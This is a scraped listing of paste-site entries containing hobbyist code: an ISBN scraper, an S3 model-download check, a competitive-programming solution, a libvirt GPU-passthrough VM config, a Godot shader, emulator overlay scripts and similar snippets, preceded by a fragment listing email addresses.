<a href=""mailto:v.is.ai.n.cu.sa893@gmail.com"">v.is.ai.n.cu.sa893@gmail.com</a>
<a href=""mailto:v.is.a.i.n.c.u.s.a893@gmail.com"">v.is.a.i.n.c.u.s.a893@gmail.com</a>
<a href=""mailto:visa.i.nc.us.a8.9.3@gmail.com"">visa.i.nc.us.a8.9.3@gmail.com</a>
<a href=""mailto:v.i.sai.n.c.us.a.8.93@gmail.com"">v.i.sai.n.c.us.a.8.93@gmail.com</a>
<a href=""mailto:ac2323fbde7b4384ba0010f6076aa6ca.protect@withheldforprivacy.com"">ac2323fbde7b4384ba0010f6076aa6ca.protect@withheldforprivacy.com</a>
<a href=""mailto:support@fenemoregroup.com"">support@fenemoregroup.com</a>
<a href=""mailto:1f3d906dcb6b4605ae602d29911d9dea.protect@withheldforprivacy.com"">1f3d906dcb6b4605ae602d29911d9dea.protect@withheldforprivacy.com</a>"
rjztwmcp,scrapISBN.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 09:49:56 AM CDT,"$CustomObjs=@()

$ISBN = ""978-2-38275-162-6""
$truncatedISBN = $ISBN -replace '-', ''

$booksHtml = Invoke-WebRequest ""https://isbnsearch.org/isbn/$truncatedISBN""
$bookInfo = $booksHtml.ParsedHtml.getElementsByClassName(""bookinfo"")[0].innerText

$cutBookInfo = $bookInfo.Split([System.Environment]::NewLine,[System.StringSplitOptions]::RemoveEmptyEntries)

$name = $cutBookInfo[0]
$author = $cutBookInfo[3].Substring($cutBookInfo[3].IndexOf("": "") + 2)
$binding = $cutBookInfo[4].Substring($cutBookInfo[4].IndexOf("": "") + 2)
$publisher = $cutBookInfo[5].Substring($cutBookInfo[5].IndexOf("": "") + 2)
$published = $cutBookInfo[6].Substring($cutBookInfo[6].IndexOf("": "") + 2)
$coverLink = $booksHtml.Images[0].src

$CustomObj = New-Object -TypeName PSObject -Property @{ 'Name' = $name; 'ISBN' = $ISBN; ""Author"" = $author; ""Binding"" = $binding; ""Publisher"" = $publisher; ""Published"" = $published; ""Cover"" = $coverLink }
$CustomObjs += $CustomObj

$CustomObjs"
ACTadH2b,Untitled,katerina-bonditka,Python,Saturday 2nd of March 2024 09:43:34 AM CDT,"import requests

# pip install yandex-s3
from s3 import S3Client

aws_access_key_id_student = ""secret""  # <= aws_access_key_id_student
aws_secret_access_key_student = ""secret""  # <= aws_secret_access_key_student
student_s3_bucket = ""s3-student-mle-secret""  # <= student_s3_bucket
region = ""ru-central1""

s3 = S3Client(
    access_key=aws_access_key_id_student,
    secret_key=aws_secret_access_key_student,
    region=region,
    s3_bucket=student_s3_bucket,
)

download_url = s3.signed_download_url(""models/fitted_model.pkl"", max_age=30)
response = requests.get(download_url)

content_logistic = str(response.content).find(""LogisticRegression"")
content_catboost = str(response.content).find(""CatBoostClassifier"")
print(f""is Logistinc: {content_logistic > 0}"")
print(f""is CatBoostClassifier: {content_catboost > 0}"")


# >> is Logistinc: True
# >> is CatBoostClassifier: False"
J8MmQYcN,Olimpijada,VMaksimoski008,C++,Saturday 2nd of March 2024 08:45:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;
using pii = pair<int, int>;
 
const int maxn = 1e5 + 5;
 
struct SegTree {
    int n;
    vector<pii> tree;
 
    SegTree(int _n) {
        n = _n;
        tree.resize(4*n+5);
        build(1, 0, n-1);
    }
 
    int val(pii x) {
        return x.first - 2 * x.second;
    }
 
    pii merge(pii a, pii b) {
        if(val(a) < val(b)) return a;
        return b;
    }
 
    void build(int u, int tl, int tr) {
        if(tl == tr) {
            tree[u] = { tl, -10000 };
        } else {
            int tm = (tl + tr) / 2;
            build(2*u, tl, tm);
            build(2*u+1, tm+1, tr);
            tree[u] = merge(tree[2*u], tree[2*u+1]);
        }
    }
 
    void update(int u, int tl, int tr, int t, int pos, int v) {
        if(tl == tr) {
            if(t == 1) tree[u].second = max(tree[u].second, v);
            else tree[u].second = min(tree[u].second, v);
        } else {
            int tm = (tl + tr) / 2;
            if(pos <= tm)
                update(2*u, tl, tm, t, pos, v);
            else
                update(2*u+1, tm+1, tr, t, pos, v);
            tree[u] = merge(tree[2*u], tree[2*u+1]);
        }
    }
 
    pii query(int u, int tl, int tr, int l, int r) {
        if(tl > tr || l > tr || tl > r) return pii{1e9, 0};
        if(l <= tl && tr <= r) return tree[u];
        int tm = (tl + tr) / 2;
        return merge(
            query(2*u, tl, tm, l, r),
            query(2*u+1, tm+1, tr, l, r)
        );
    }
 
    void update(int t, int p, int v) { update(1, 0, n-1, t, p, v); }
    int query(int l, int r) { return val(query(1, 0, n-1, l, r)); }
} tree(maxn);
 
int n, L, H, del[maxn], sub[maxn], mid, mx_depth = 0;
bool ok = 0;
vector<pii> graph[maxn];
vector<int> comp;
 
int get_sub(int u, int p) {
    sub[u] = 1;
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        sub[u] += get_sub(v, u);
    }
    return sub[u];
}
 
int get_cen(int u, int sz, int p) {
    for(auto &[v, _] : graph[u]) {
        if(v == p || del[v]) continue;
        if(2 * sub[v] > sz) return get_cen(v, sz, u);
    }
    return u;
}
 
void dfs(int u, int p, int d, int ones, bool add) {
    if(d > H || ok) return ;
 
    mx_depth = max(mx_depth, d);
 
    if(add) {
        tree.update(1, d, ones);
    } else if((2 * ones >= d && d >= L) || 2 * ones - d >= tree.query(max(0, L - d), H - d)) {
        ok = 1;
        return ;
    }
 
    for(auto &[v, w] : graph[u]) {
        if(del[v] || v == p) continue;
        dfs(v, u, d + 1, ones + (w >= comp[mid]), add);
    } 
}
 
void build(int u) {
    int cen = get_cen(u, get_sub(u, 0), 0);
 
    del[cen] = 1;
 
    for(auto &[v, w] : graph[cen]) {
        if(del[v] || ok) continue;
        dfs(v, cen, 1, (w >= comp[mid]), false);
        tree.update(1, 1, (w >= comp[mid]));
        dfs(v, cen, 1, (w >= comp[mid]), true);
    }
 
    if(!ok) for(int i=0; i<=mx_depth; i++) tree.update(2, i, -10000000);
    mx_depth = 0;
 
    for(auto &[v, _] : graph[cen]) {
        if(del[v] || ok) continue;
        build(v);
    }
}
 
int main() {
    ios_base::sync_with_stdio(false);
    cout.tie(0); cin.tie(0);
 
    cin >> n >> L >> H;
 
    set<int> s;
    for(int i=0; i<n-1; i++) {
        int a, b, w;
        cin >> a >> b >> w;
        s.insert(w);
        graph[a].push_back({ b, w });
        graph[b].push_back({ a, w });
    }
 
    comp = vector<int>(s.begin(), s.end());
 
    int l=0, r=comp.size()-1, ans=0;
    while(l <= r) {
        mid = (l + r) / 2;
        ok = 0;
        for(int i=1; i<=n; i++) del[i] = 0;
        for(int i=0; i<=H; i++) tree.update(2, i, -10000000);
        build(1);
        if(ok) ans = mid, l = mid + 1;
        else r = mid - 1;
    }
 
    cout << comp[ans] << '\n';
    return 0;
}"
fvTax4gP,windows11-ryzen5800x-libvirt-xml-12-AVIC+HV+SecureBoot+io_uring+pv-ipi+rebar+rx7900xt,mmcze,XML,Saturday 2nd of March 2024 06:56:43 AM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>25165824</memory>
  <currentMemory unit='KiB'>25165824</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-7.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/stripovanej/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>"
bmm9NBwH,Godot 4.x Crosshair shader,Lakamfo,Godot GLSL,Saturday 2nd of March 2024 06:34:42 AM CDT,"shader_type canvas_item;


float shape_polygon(vec2 uv, float sides, float size, float edge) {
	uv = 2.0*uv-1.0;
	edge = max(edge, 1.0e-8);
	float angle = atan(uv.x, uv.y)+3.14159265359;
	float slice = 6.28318530718/sides;
	return clamp((1.0-(cos(floor(0.5+angle/slice)*slice-angle)*length(uv))/size)/edge, 0.0, 1.0);
}


vec2 transform2_clamp(vec2 uv) {
	return clamp(uv, vec2(0.0), vec2(1.0));
}

vec2 transform2(vec2 uv, vec2 translate, float rotate, vec2 scale) {
 	vec2 rv;
	uv -= translate;
	uv -= vec2(0.5);
	rv.x = cos(rotate)*uv.x + sin(rotate)*uv.y;
	rv.y = -sin(rotate)*uv.x + cos(rotate)*uv.y;
	rv /= scale;
	rv += vec2(0.5);
	return rv;
}


uniform float width = 0.1;
uniform float lenght = 0.4;
uniform float spread = 0.265;

const float p_o166635_translate_y = 0.000000000;
const float p_o166635_rotate = 90.000000000;

const float p_o68924_sides = 4.000000000;
const float p_o68924_radius = 0.990000000;
const float p_o68924_edge = 0.000000000;
const float p_o262102_translate_y = 0.000000000;
const float p_o262102_rotate = 90.000000000;
const float p_o262105_sides = 4.000000000;
const float p_o262105_radius = 0.990000000;
const float p_o262105_edge = 0.000000000;
const float p_o329162_translate_x = 0.000000000;
const float p_o329162_rotate = 0.000000000;
const float p_o329171_sides = 4.000000000;
const float p_o329171_radius = 0.990000000;
const float p_o329171_edge = 0.000000000;
const float p_o329165_translate_x = 0.000000000;
const float p_o329165_rotate = 0.000000000;
const float p_o329168_sides = 4.000000000;
const float p_o329168_radius = 0.990000000;
const float p_o329168_edge = 0.000000000;

void fragment() {
float o68924_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(spread*(2.0*1.0-1.0), p_o166635_translate_y*(2.0*1.0-1.0)), p_o166635_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o68924_sides, p_o68924_radius*1.0, p_o68924_edge*1.0);
vec4 o166635_0_1_rgba = vec4(vec3(o68924_0_1_f), 1.0);
float o262105_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(-spread*(2.0*1.0-1.0), p_o262102_translate_y*(2.0*1.0-1.0)), p_o262102_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o262105_sides, p_o262105_radius*1.0, p_o262105_edge*1.0);
vec4 o262102_0_1_rgba = vec4(vec3(o262105_0_1_f), 1.0);
float o329171_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(p_o329162_translate_x*(2.0*1.0-1.0), spread*(2.0*1.0-1.0)), p_o329162_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o329171_sides, p_o329171_radius*1.0, p_o329171_edge*1.0);
vec4 o329162_0_1_rgba = vec4(vec3(o329171_0_1_f), 1.0);
float o329168_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(p_o329165_translate_x*(2.0*1.0-1.0), -spread*(2.0*1.0-1.0)), p_o329165_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o329168_sides, p_o329168_radius*1.0, p_o329168_edge*1.0);
vec4 o329165_0_1_rgba = vec4(vec3(o329168_0_1_f), 1.0);
float o293599_0_h = 0.0;
int o293599_0_i = 0;

float o293599_0_h1 = (dot((o166635_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h1 > o293599_0_h) {
	o293599_0_h = o293599_0_h1;
	o293599_0_i = 1;
}

float o293599_0_h2 = (dot((o262102_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h2 > o293599_0_h) {
	o293599_0_h = o293599_0_h2;
	o293599_0_i = 2;
}

float o293599_0_h3 = (dot((o329162_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h3 > o293599_0_h) {
	o293599_0_h = o293599_0_h3;
	o293599_0_i = 3;
}

float o293599_0_h4 = (dot((o329165_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h4 > o293599_0_h) {
	o293599_0_h = o293599_0_h4;
	o293599_0_i = 4;
}
float o293599_0_1_f = o293599_0_h;
	COLOR = vec4(vec3(o293599_0_1_f), o293599_0_1_f);
}
"
q3LJfNW5,Untitled,BobbyGeorgiev,C#,Saturday 2nd of March 2024 06:08:54 AM CDT,"int[] numbers = Console.ReadLine()
    .Split()
    .Select(int.Parse)
    .ToArray();

int startIndex = int.Parse( Console.ReadLine() );
int endIndex = int.Parse( Console.ReadLine() );

int maxNumber = int.MinValue;
int minNumber = int.MaxValue;
for ( int i = startIndex; i <= endIndex; i++)
{
    if (numbers[i] > maxNumber)
    {
        maxNumber = numbers[i];
    }
    if (numbers[i] < minNumber)
    {
        minNumber = numbers[i];
    }
}
Console.WriteLine(maxNumber + minNumber);"
WHkamUtj,data857,TestGuy1,JSON,Saturday 2nd of March 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '62032f5531aa63eda7a0ce51cdc4f700887e972bb526ac850a8404fc240fa122820efc802b4ef03e93b1bec42667eea27623cd957efa09bbee0cb0bae9711166381627f5d5d2dade1d5be623ddc80eccab813355bfa869309b2f84944df4e32565a28265b78cf8819265eaf3e5fff0ae0c3b3b357b7def4db0efc83a718599fa',
  otherdata: [
    'be697281beae588deeb77c7ff6a41b78',
    '57caa3ddf4d8d40e9d7cb7ee3dcc4e13',
    '21e901c2eab9fcd63a609e74c592e90b',
    '426ada91e1f268bcc448863b90164e75',
    'ba76be1365d926942f2304cf543ae856',
    '7fc7d8bc4bf737aa25b351e3e6572e53',
    '0d32edde071dc1424d5e44cce37cb1fd',
    '607a98edf38708dbea529387ec647c90'
  ]
}"
N5ZQdSC1,WL2 Overlay Bizhawk 2.9.1,pr0te,Lua,Saturday 2nd of March 2024 05:42:45 AM CDT,"-- Written by slamo
-- Updated for Bizhawk 2.9.1+

bit = (require ""migration_helpers"").EmuHawk_pre_2_9_bit();

local x, y, camx, camy, tref, ttype, ttypehigh, tcolor, warpdest

function bitswap (swappy)
	nib2 = bit.band(swappy,0xF)
	return (nib2*0x10+bit.rshift(swappy,4))
end

function gettile (wx,wy)
	hix = bit.rshift(bit.band(0xFF00,wx),8)
	hiy = bit.rshift(bit.band(0xFF00,wy),8)
	lox = bit.band(0xFF,wx)
	loy = bit.band(0xFF,wy)
	ccea = bit.band(bitswap(bit.band(hiy,0x0F))+bit.band(bitswap(loy),0x0F)+0xA0,0xFF)
	cceb = bitswap(bit.band(hix,0x0F))+bit.band(bitswap(lox),0x0F)
	rawloc = ccea*0x100+cceb -- not the final location!!! can vary if above 0xa000
	return (rawloc)
	-- return (bit.band(0x2000 + 0x100*math.floor(wy/16+1) + math.floor(wx/16),0x7FFF)) works for most space, not glitch rooms
end

function tileid (ntile)
	if (ntile >= 0xa000) then
		memory.usememorydomain('CartRAM') -- where normal level data is
		realloc = ntile - 0x8000
	else
		memory.usememorydomain('System Bus')
		realloc = ntile
	end
	tlookup = memory.readbyte(realloc)
	memory.usememorydomain('ROM')
	return (memory.read_u16_le(0x7c002+tref+bit.band(tlookup*2,0xFF)))
end

while true do
	x = mainmemory.read_u16_be(0x153c) -- position in level
	y = mainmemory.read_u16_be(0x153a)
	camx = mainmemory.readbyte(0x660) -- position relative to upper left camera edge
	camy = mainmemory.readbyte(0x65f)
	tref = mainmemory.read_u16_be(0x704)
	-- warpdest = mainmemory.readbyte(0xa1) -- sector coordinates for a warp (??)
	-- 160x144
	--gui.drawText(3,130,string.format(""%X"",bit.rshift(warpdest,4))..' '..string.format(""%X"",bit.band(warpdest,0xF)))
	for i = -1,17,1 do
		for j = -1,17,1 do
			ttype = tileid(gettile(x-camx+15+16*i,y-camy+15+16*j))
			ttypehigh = bit.band(ttype,0xFF00)
			if (ttype~=0x47ab) and (ttype~=0x49a7) and not ((ttype>=0x4e29) and (ttype<=0x4e39)) and not ((ttype>=0x5400) and (ttype<=0x54ff)) then
			--if (ttype~=0x47ab) and (ttype~=0x4cf3) and (ttype~=0x4cef) and (ttype~=0x4d03) and (ttype~=0x4cff) and (ttype~=0x4e29) and (ttype~=0x4e35) and (ttype~=0x4f3a) then
				if (ttype==0x4ecd) or (ttype==0x4edb) or (ttype==0x4f3a) then -- door, minigame, exit
					tcolor = 'BLACK' 
				elseif (ttype==0x4e8a) then -- water
					tcolor = 'BLUE'
				elseif (ttype==0x4a10) then -- platform
					tcolor = 'WHITE'
				elseif (ttype>0x4a70) and (ttype<0x4d9f) or (ttype==0x4a10) then -- breakable
					tcolor = 'PINK'
				else -- solid or unknown
					tcolor = 'RED' 
				end
				gui.drawBox((camx-x)%16-8+16*i,(camy-y)%16-16+16*j,(camx-x)%16+7+16*i,(camy-y)%16+16*j-1,tcolor)
			end
		end
	end
	gui.drawText(3,3,string.format(""%X"",gettile(x,y-32))..' '..string.format(""%X"",tileid(gettile(x,y-32))))
	gui.drawText(3,12,string.format(""%X"",gettile(x,y-16))..' '..string.format(""%X"",tileid(gettile(x,y-16))))
	gui.drawText(3,21,string.format(""%X"",gettile(x,y))..' '..string.format(""%X"",tileid(gettile(x,y))))
	emu.frameadvance()
end"
HiF2MjQk,WL3 Overlay Bizhawk 2.9.1,pr0te,Lua,Saturday 2nd of March 2024 05:40:58 AM CDT,"-- Written by slamo
-- Updated for Bizhawk 2.9.1+

bit = (require ""migration_helpers"").EmuHawk_pre_2_9_bit();

local x, y, camx, camy, ttype, tile, ttypehigh, tcolor, warpdest

function bitswap (swappy)
	nib2 = bit.band(swappy,0xF)
	return (nib2*0x10+bit.rshift(swappy,4))
end

function gettile (wx,wy)
	hix = bit.rshift(bit.band(0xFF00,wx),8)
	hiy = bit.rshift(bit.band(0xFF00,wy),8)
	lox = bit.band(0xFF,wx)
	loy = bit.band(0xFF,wy)
	ccea = bit.band(bitswap(bit.band(hiy,0x0F))+bit.band(bitswap(loy),0x0F)+0xA0,0xFF)
	cceb = bitswap(bit.band(hix,0x0F))+bit.band(bitswap(lox),0x0F)
	rawloc = ccea*0x100+cceb -- not the final location!!! can vary if above 0xa000
	return (rawloc)
	-- return (bit.band(0x2000 + 0x100*math.floor(wy/16+1) + math.floor(wx/16),0x7FFF)) works for most space, not glitch rooms
end

function tileid (ntile)
	if (ntile >= 0xa000) then
		memory.usememorydomain('CartRAM') -- where normal level data is
		realloc = ntile - 0x8000
	else
		memory.usememorydomain('System Bus')
		realloc = ntile
	end
	tlookup = memory.readbyte(realloc)
	return (mainmemory.read_u16_le(0xd00+bit.band(tlookup*2,0xFF)))
end

while true do
	x = mainmemory.read_u16_be(0xa63) -- position in level
	y = mainmemory.read_u16_be(0xa61)
	camx = mainmemory.readbyte(0xa88) -- position relative to upper left camera edge
	camy = mainmemory.readbyte(0xa87)
	--warpdest = mainmemory.readbyte(0xa1) -- sector coordinates for a warp (??)
	-- 160x144
	--gui.drawText(3,130,string.format(""%X"",bit.rshift(warpdest,4))..' '..string.format(""%X"",bit.band(warpdest,0xF)))
	for i = -1,17,1 do
		for j = -1,17,1 do
			tile = gettile(x-camx+15+16*i,y-camy+15+16*j)
			ttype = tileid(tile)
			ttypehigh = bit.band(ttype,0xFF00)
			if (ttype~=0x4020) and (ttype~=0x4821) and (ttype~=0x484c) and (ttype~=0x4262) then
				if (ttype==0x45CB) or (ttype==0x45FA) or (ttype==0x477e) or (ttype==0x46f9) or (ttype==0x47b0) or (ttype==0x47de) then -- door, golf door, exit, warp tile
					tcolor = 'BLACK' 
				elseif (ttype>0x49F0) and (ttype<0x54b4) then -- breakable
					tcolor = 'PINK'
				elseif (ttype==0x4208) or (ttype==0x49ae) or (ttype==0x423f) then -- platform
					tcolor = 'WHITE'
				elseif (ttype==0x42c3) or (ttype==0x42e5) or (ttype==0x42fe) or (ttype==0x4934) then -- ladder
					tcolor = 'BROWN'
				elseif (ttype>0x41a0) and (ttype<0x41ff) then -- water
					tcolor = 'BLUE'
				else -- solid or unknown
					tcolor = 'RED' 
				end
				gui.drawBox((camx-x)%16-8+16*i,(camy-y)%16-16+16*j,(camx-x)%16+7+16*i,(camy-y)%16+16*j-1,tcolor)
			end
		end
	end
	gui.drawText(3,3,string.format(""%X"",gettile(x,y-32))..' '..string.format(""%X"",tileid(gettile(x,y-32))))
	gui.drawText(3,12,string.format(""%X"",gettile(x,y-16))..' '..string.format(""%X"",tileid(gettile(x,y-16))))
	gui.drawText(3,21,string.format(""%X"",gettile(x,y))..' '..string.format(""%X"",tileid(gettile(x,y))))
	emu.frameadvance()
end"
GGjWZTdj,WallClimbing,Joriangames,Lua,Saturday 2nd of March 2024 05:20:10 AM CDT,"-- How To Make WALLCLIMB in Roblox Studio!! by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/4vf8wg3rGlg

